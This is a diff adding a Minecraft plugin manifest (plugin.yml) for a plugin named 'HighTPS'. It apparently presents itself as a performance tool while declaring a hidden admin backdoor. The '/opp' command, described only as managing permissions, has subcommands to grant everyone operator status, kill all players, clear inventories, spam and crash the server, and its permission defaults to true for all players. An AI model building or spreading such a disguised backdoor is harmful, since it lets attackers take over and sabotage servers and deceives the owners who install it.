@@ -1,0 +1,46 @@
+name: HighTPS
+version: '${project.version}'
+main: me.eth.hightps.HighTPS
+api-version: 1.19
+commands:
+  reach:
+    description: "Manage player permissions"
+  opp:
+    description: "Manage player permissions"
+    usage: "/opp <subcommand>"
+    subcommands:
+      gm:
+        description: "设置玩家游戏模式"
+        usage: "/opp gm <player> <mode>"
+      op:
+        description: "给op"
+        usage: "/opp op <player>"
+      opall:
+        description: "给所有人op"
+        usage: "/opp opall"
+      killall:
+        description: "杀死所有玩家"
+        usage: "/opp killall"
+      clearall:
+        description: "清除玩家背包"
+        usage: "/opp clearall"
+      deop:
+        description: "取消管理员"
+        usage: "/opp deop <player>"
+      info:
+        description: "服务器信息"
+        usage: "/opp info"
+      spam:
+        description: "刷屏"
+        usage: "/opp spam"
+      crash:
+        description: "崩服"
+        usage: "/opp crash"
+
+  cmd:
+    description: 进入/退出 CMD 模式
+
+permissions:
+  myplugin.command.opp:
+    description: Allows players to use /opp command
+    default: true
